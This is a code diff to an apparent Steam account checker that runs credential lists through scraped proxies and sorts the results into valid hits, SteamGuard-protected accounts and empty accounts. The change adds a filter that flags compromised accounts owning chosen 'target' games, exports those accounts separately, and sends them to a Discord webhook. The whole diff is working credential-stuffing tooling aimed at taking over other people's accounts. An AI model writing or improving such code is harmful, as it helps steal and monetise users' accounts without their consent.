@@ -21,6 +21,7 @@ from nexus.core.proxy_scraper import scrape_fresh_proxies, filter_operational_pr
 from nexus.core.transport import SessionTransportPool
 from nexus.utils.exporter import ResultExporter
 from nexus.utils.discord import DiscordWebhookDispatcher
+from nexus.utils.targets import evaluate_target_account
 
 
 class ValidationEngine(QThread):
@@ -89,6 +90,7 @@ class ValidationEngine(QThread):
             self.total_count = 0
 
         self.checked_count = self.skip_to_index
+        self.target_hit_count = 0
         self.hit_count = 0
         self.free_count = 0
         self.invalid_count = 0
@@ -103,6 +105,7 @@ class ValidationEngine(QThread):
             state = {
                 "checked": self.checked_count,
                 "total": self.total_count,
+                "target_hits": self.target_hit_count,
                 "hits": self.hit_count,
                 "two_fa": self.two_fa_count,
                 "timestamp": time.time(),
@@ -274,7 +277,7 @@ class ValidationEngine(QThread):
 
         await self.transport_pool.close_all()
 
-        # Emit final telemetry state
+        # Emit final telemetry state and generate final batch report
         elapsed = max(0.001, time.time() - self.start_time)
         cpm = int((self.checked_count / elapsed) * 60)
         self.progress_updated.emit(self.checked_count, self.total_count)
@@ -282,12 +285,21 @@ class ValidationEngine(QThread):
             "total": self.total_count,
             "checked": self.checked_count,
             "hits": self.hit_count,
+            "target_hits": self.target_hit_count,
             "free": self.free_count,
             "invalid": self.invalid_count,
             "cpm": cpm,
             "elapsed": int(elapsed)
         })
         self._save_checkpoint()
+        self.exporter.finalize_validation_batch(
+            total_checked=self.checked_count,
+            total_hits=self.hit_count,
+            target_hits=self.target_hit_count,
+            two_fa_count=self.two_fa_count,
+            invalid_count=self.invalid_count,
+            elapsed_sec=elapsed
+        )
 
     async def _worker_routine(
         self,
@@ -419,17 +431,26 @@ class ValidationEngine(QThread):
 
                 # Process verified outcome
                 self.checked_count += 1
+
+                is_target, matched_targets = evaluate_target_account(result)
+                if is_target:
+                    result["matched_targets"] = matched_targets
+
+                self.exporter.record_item_live(result)
+
                 if status == "HIT":
                     self.hit_count += 1
-                    self.log_emitted.emit(f"[HIT] {username} | Games: {result['total_games']}", "SUCCESS")
-                    if self.discord_dispatcher:
-                        await self.discord_dispatcher.dispatch_hit(result)
+                    if is_target:
+                        self.target_hit_count += 1
+                        self.exporter.record_target_hit(result, matched_targets)
+                        self.log_emitted.emit(f"[🎯 TARGET HIT] {username} | {len(matched_targets)} Target Games", "SUCCESS")
+                        if self.discord_dispatcher:
+                            await self.discord_dispatcher.dispatch_hit(result)
+                    else:
+                        self.log_emitted.emit(f"[HIT] {username} | Games: {result['total_games']} (Paid)", "SUCCESS")
                 elif status == "2FA_HIT":
-                    self.hit_count += 1
                     self.two_fa_count += 1
-                    self.log_emitted.emit(f"[HIT/2FA] {username} | SteamGuard Active", "SUCCESS")
-                    if self.discord_dispatcher:
-                        await self.discord_dispatcher.dispatch_hit(result)
+                    self.log_emitted.emit(f"[HIT/2FA] {username} | SteamGuard Active", "WARNING")
                 elif status == "FREE":
                     self.free_count += 1
                     self.log_emitted.emit(f"[FREE] {username} | Zero Library", "INFO")
@@ -437,9 +458,6 @@ class ValidationEngine(QThread):
                     self.invalid_count += 1
                 else:
                     self.error_count += 1
-
-                # Live disk record
-                self.exporter.record_item_live(result)
 
                 # Save checkpoint periodically (every 50 accounts)
                 if self.checked_count % 50 == 0:
